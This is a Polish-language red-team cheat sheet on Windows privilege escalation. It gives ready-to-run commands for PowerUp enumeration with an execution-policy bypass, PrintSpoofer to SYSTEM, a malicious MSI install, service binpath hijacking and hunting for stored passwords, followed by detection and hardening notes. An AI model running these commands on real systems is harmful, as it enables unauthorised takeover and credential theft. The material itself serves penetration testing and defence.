---
title: "Windows Privilege Escalation"
category: "red-team"
tags: ["privesc", "windows", "post-exploitation"]
platform: "windows"
mitre: ["T1548", "T1068"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Windows Privilege Escalation

## TL;DR
Enumeruj automatem (WinPEAS) → szukaj: nieaktualne usługi, słabe uprawnienia usług, unquoted paths, AlwaysInstallElevated, tokeny, poświadczenia w plikach/rejestrze.

## Enumeracja
```powershell
# Automaty
.\winPEASx64.exe
# PowerUp
powershell -ep bypass -c "IEX(Get-Content PowerUp.ps1 -Raw); Invoke-AllChecks"

# Ręcznie
whoami /priv                 # przywileje tokenu (Se*Privilege)
systeminfo                   # patch level -> exploit suggester
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows"
```

## Wektory
```text
- SeImpersonatePrivilege     -> Potato (JuicyPotatoNG / PrintSpoofer) -> SYSTEM
- Unquoted service path      -> podłóż exe w ścieżce ze spacją
- Weak service perms         -> sc config <svc> binpath="cmd /c ..."; sc start
- AlwaysInstallElevated (1/1) -> msiexec złośliwy .msi jako SYSTEM
- Modifiable %PATH% / DLL hijack
- Credentials                -> unattend.xml, Web.config, cmdkey /list, rejestr
```

```powershell
# SeImpersonate -> SYSTEM
.\PrintSpoofer64.exe -i -c cmd

# AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi

# Szukaj haseł
findstr /si password *.xml *.ini *.config
cmdkey /list
```

## Wykrywanie (Blue Team)
- `sc config` zmieniające binPath, tworzenie usług (Event **7045**).
- Procesy potomne `spoolsv.exe`/named-pipe impersonation (Potato).
- Sysmon Event 1 (process create) z nietypowych ścieżek.

## Mitygacja / Hardening
- Cudzysłowy w ścieżkach usług, poprawne ACL usług, patching.
- Wyłącz AlwaysInstallElevated, LAPS na kontach lokalnych, usuń Print Spooler gdzie zbędny.

## Źródła
- [PayloadsAllTheThings – Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- Zobacz też: [token-impersonation.md](./token-impersonation.md)
